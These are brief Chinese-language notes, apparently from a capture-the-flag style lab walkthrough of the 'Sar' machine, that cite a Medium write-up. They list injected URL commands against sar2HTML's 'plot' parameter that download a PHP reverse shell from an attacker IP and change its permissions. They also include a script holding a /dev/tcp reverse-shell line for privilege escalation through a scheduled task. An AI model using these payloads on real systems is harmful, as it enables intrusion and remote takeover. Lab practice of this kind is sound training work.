参考文档  
[https://medium.com/@cyberarri/sar-pg-play-writeup-359ddea67161](https://medium.com/@cyberarri/sar-pg-play-writeup-359ddea67161)
   

上传shell  
[http://192.168.166.35/sar2HTML/index.php?plot=;wget%20http://192.168.45.184/rev.php](http://192.168.166.35/sar2HTML/index.php?plot=;wget%20http://192.168.45.184/rev.php)
    
注意提权用户的权限  
[http://192.168.166.35/sar2HTML/index.php?plot=;](http://192.168.166.35/sar2HTML/index.php?plot=;chmod)chmod 777 rev.php
   

需要手敲的  
echo '#!/bin/sh' \>write.sh  
echo 'sh -i \>& /dev/tcp/192.168.45.184/1234 0\>&1' \>\> write.sh
    
需要有一个五分钟的等待时间。